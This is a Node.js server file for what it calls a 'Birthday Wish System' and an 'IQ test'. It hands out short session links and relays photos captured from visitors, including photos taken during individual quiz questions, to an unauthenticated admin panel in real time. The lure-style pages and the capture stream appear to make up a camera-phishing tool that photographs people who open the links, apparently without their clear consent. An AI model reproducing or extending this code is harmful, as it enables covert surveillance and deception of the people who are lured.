const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// serve static files from project folder
app.use(express.static(path.join(__dirname)));

// Health check endpoint for Render - using a different path
app.get('/health', (req, res) => {
  res.send('Birthday Wish System is running!');
});

// Handle short birthday links
app.get('/wish/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if session exists
  const sessionData = sessions.get(sessionId);
  const sessionName = sessionData ? sessionData.sessionName : 'Birthday Celebration';
  
  // Redirect to birthday page with session parameters
  const redirectUrl = `/birthday.html?session=${sessionId}&name=${encodeURIComponent(sessionName)}`;
  res.redirect(redirectUrl);
});

// Handle IQ test links
app.get('/iqtest/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Check if IQ session exists, create if it doesn't
  if (!iqSessions.has(sessionId)) {
    iqSessions.set(sessionId, {
      id: sessionId,
      participantName: 'Anonymous',
      created: Date.now(),
      status: 'active',
      photoCount: 0
    });
    console.log(`IQ Session auto-created: ${sessionId}`);
  }
  
  // Serve the IQ test page
  res.sendFile(path.join(__dirname, 'iq-test.html'));
});

// Root route - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Session and client management
const adminClients = new Set();
const userClients = new Map(); // sessionId -> Set of user WebSockets
const sessions = new Map(); // sessionId -> session metadata
const iqSessions = new Map(); // sessionId -> IQ test session metadata
const iqPhotos = new Map(); // sessionId -> array of photo captures
let totalImages = 0;

function broadcastToAdmins(message) {
  const messageStr = JSON.stringify(message);
  for (let admin of adminClients) {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(messageStr);
    }
  }
}

function updateAdminStats() {
  const stats = {
    type: 'stats',
    totalImages: totalImages,
    activeSessions: Array.from(sessions.keys()),
    connectedUsers: Array.from(userClients.values()).reduce((sum, set) => sum + set.size, 0)
  };
  broadcastToAdmins(stats);
}

wss.on('connection', (ws, req) => {
  ws.on('message', (msg) => {
    let data = null;
    
    try {
      data = JSON.parse(msg.toString());
    } catch (e) {
      console.warn('Invalid JSON message:', e);
      return;
    }
    
    if (data.type === 'register') {
      if (data.role === 'admin') {
        ws.isAdmin = true;
        adminClients.add(ws);
        console.log('Admin connected');
        
        // Send current stats to new admin
        updateAdminStats();
        
      } else if (data.role === 'user' && data.sessionId) {
        ws.isUser = true;
        ws.sessionId = data.sessionId;
        
        // Add to user clients for this session
        if (!userClients.has(data.sessionId)) {
          userClients.set(data.sessionId, new Set());
        }
        userClients.get(data.sessionId).add(ws);
        
        console.log(`User connected to session: ${data.sessionId}`);
        
        // For IQ test sessions, update the session and notify admins
        if (iqSessions.has(data.sessionId)) {
          const session = iqSessions.get(data.sessionId);
          session.status = 'active';
          session.lastActive = Date.now();
          
          // Notify admins about active IQ session
          broadcastToAdmins({
            type: 'iq_session_active',
            sessionId: data.sessionId,
            participantName: session.participantName,
            status: session.status
          });
        }
        
        // Notify admins
        broadcastToAdmins({ type: 'user_connected', sessionId: data.sessionId });
        updateAdminStats();
      }
      
    } else if (data.type === 'create_session') {
      // Admin is creating a new session
      sessions.set(data.sessionId, {
        id: data.sessionId,
        name: data.sessionName,
        created: Date.now(),
        imageCount: 0
      });
      console.log(`Session created: ${data.sessionId} (${data.sessionName})`);
      updateAdminStats();
      
    } else if (data.type === 'create_iq_session') {
      // Admin is creating a new IQ test session
      iqSessions.set(data.sessionId, {
        id: data.sessionId,
        participantName: data.participantName,
        created: Date.now(),
        status: 'active',
        photoCount: 0
      });
      console.log(`IQ Session created: ${data.sessionId} (${data.participantName})`);
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_session_created',
        sessionId: data.sessionId,
        participantName: data.participantName
      });
      
    } else if (data.type === 'iq_photo_capture') {
      // IQ test photo capture
      if (!iqPhotos.has(data.sessionId)) {
        iqPhotos.set(data.sessionId, []);
      }
      
      const photoData = {
        type: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      };
      
      iqPhotos.get(data.sessionId).push(photoData);
      
      // Update session photo count
      if (iqSessions.has(data.sessionId)) {
        iqSessions.get(data.sessionId).photoCount++;
      }
      
      // Forward to all admins
      broadcastToAdmins({
        type: 'iq_photo_captured',
        sessionId: data.sessionId,
        photoType: data.photoType,
        timestamp: data.timestamp,
        currentQuestion: data.currentQuestion,
        photo: data.photo
      });
      
      console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
      
    } else if (data.type === 'iq_test_complete') {
      // IQ test completion
      if (iqSessions.has(data.sessionId)) {
        const session = iqSessions.get(data.sessionId);
        session.status = 'completed';
        session.score = data.score;
        session.correctAnswers = data.correctAnswers;
        session.totalQuestions = data.totalQuestions;
        session.completedAt = data.timestamp;
      }
      
      // Notify admins
      broadcastToAdmins({
        type: 'iq_test_completed',
        sessionId: data.sessionId,
        score: data.score,
        correctAnswers: data.correctAnswers,
        totalQuestions: data.totalQuestions,
        timestamp: data.timestamp
      });
      
      console.log(`IQ Test completed: ${data.sessionId} - Score: ${data.score}`);
      
    } else if (data.type === 'image' && data.sessionId) {
      // User is sending an image
      totalImages++;
      
      // Update session image count
      if (sessions.has(data.sessionId)) {
        sessions.get(data.sessionId).imageCount++;
      }
      
      // Forward to all admins
      broadcastToAdmins({
        type: 'image',
        sessionId: data.sessionId,
        time: data.time,
        payload: data.payload,
        captureNumber: data.captureNumber
      });
      
      updateAdminStats();
      
    } else if (data.type === 'session_ended' && data.sessionId) {
      // User ended their session
      console.log(`Session ended: ${data.sessionId}`);
      broadcastToAdmins({ type: 'session_ended', sessionId: data.sessionId });
    }
  });

  ws.on('close', () => {
    if (ws.isAdmin) {
      adminClients.delete(ws);
      console.log('Admin disconnected');
    } else if (ws.isUser && ws.sessionId) {
      const sessionUsers = userClients.get(ws.sessionId);
      if (sessionUsers) {
        sessionUsers.delete(ws);
        if (sessionUsers.size === 0) {
          userClients.delete(ws.sessionId);
        }
      }
      
      // Notify admins
      broadcastToAdmins({ type: 'user_disconnected', sessionId: ws.sessionId });
      updateAdminStats();
      
      console.log(`User disconnected from session: ${ws.sessionId}`);
    }
  });
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebImageAnalyzer server listening on port ${PORT}`);
  console.log(`Admin panel: http://localhost:${PORT}/admin.html`);
});
